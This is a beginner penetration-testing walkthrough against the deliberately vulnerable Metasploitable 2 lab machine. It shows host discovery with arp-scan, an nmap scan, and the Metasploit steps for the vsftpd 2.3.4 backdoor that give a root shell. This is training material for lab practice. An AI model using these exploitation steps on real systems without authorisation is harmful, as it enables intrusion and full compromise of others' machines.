Metasploitable 2
Metasploitable 2 is a deliberately vulnerable linux machine that is meant for beginners to practice their penetration testing skills. The challenges included in implementable are straightforward but also provide you with the basis of hacking.
Getting started
I’m going to use an attack machine(Kai Linux) and target (metasploitable 2) set up in my hypervisor and ready to go. I am using a Vmware workstation.
The first thing that I did was to log in to the metasploitable machine using default credentials(msfadmin:msfadmin) and discover the IP address of the machine. I need this IP address to be able to scan the open ports on the metasploitable machine. 

Scanning   

This below command will scan the local area network and give us the IP of the target machine.   

arp-scan -l


The next thing that I did was to scan the target machine from my attack machine. Scanning is the process of discovering the open ports on the target machine and the services running on those ports. This helps to narrow down the attack pattern against that machine. I used nmap for scanning:
nmap -p- -v -sT -sV -O -oN Temp.xml
Let’s break the options down
sV: probe open ports to determine service and version information
sT: TCP connect
-p-: scan all ports
-O: operating system of the target machine



The image above shows the results from the scanning. After you do the scan, you’ll notice that the target machine has a considerable number of open ports, which means there are various attack vectors in this machine.
FTP, on port 21, is on top of the list from the scan results. It also shows the version being used, vsftpd 2.3.4. This gave me an idea on enumeration, and I went on to search if there are any known vulnerabilities on that version.

Exploitation
This version of ftp has a malicious backdoor installed on it that grants the attacker root access into the target machine. After reading about the exploit, I went and searched for it in the exploit database.
msfconsole
search vsftpd 2.3.4
The exploit is available in the database, so I can use the exploit to gain access into the target machine.
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 
exploit
After running the exploit, we get a shell inside the target machine. Running whoami shows that I am running as root, hence we have achieved our goal.
And that is how we do a simple ftp exploit on Metasploitable 2. I hope that was understandable, and easy to follow through.
